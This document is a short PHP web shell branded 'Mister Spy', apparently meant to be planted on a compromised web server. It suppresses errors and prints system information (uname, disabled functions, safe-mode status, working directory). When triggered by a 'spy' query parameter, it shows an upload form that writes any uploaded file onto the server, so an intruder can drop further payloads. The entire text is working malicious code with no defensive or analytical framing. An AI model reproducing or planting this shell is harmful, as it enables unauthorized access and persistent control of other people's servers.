<?php $str = 'TWlzdGVyU3B5VGVzdDA=';echo base64_decode($str); ?><?php 
// name of the file is: i (it has no extension)
error_reporting(0);
$Ye = "_Ye";
if(isset($_GET["spy"]))
	{
		echo"Mister Spy{$Ye} <font color=#000FFF>[uname]".php_uname()."[/uname]";echo "<br>";print "
";if(@ini_get("disable_functions")){echo "DisablePHP=".@ini_get("disable_functions");}else{ echo "Disable PHP = NONE";}echo "<br>";print "
";if(@ini_get("safe_mode")){echo "Safe Mode = ON";}else{ echo "Safe Mode = OFF";} echo "<br>";print "
";echo"<form method=post enctype=multipart/form-data>";echo"<input type=file name=f><input name=v type=submit id=v value=up><br>";if($_POST["v"]==up){if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){echo"<b>berhasil</b>-->".$_FILES["f"]["name"];}else{echo"<b>gagal";}} }

echo 'uname:'.php_uname()."
";
echo getcwd() . "
";

?>
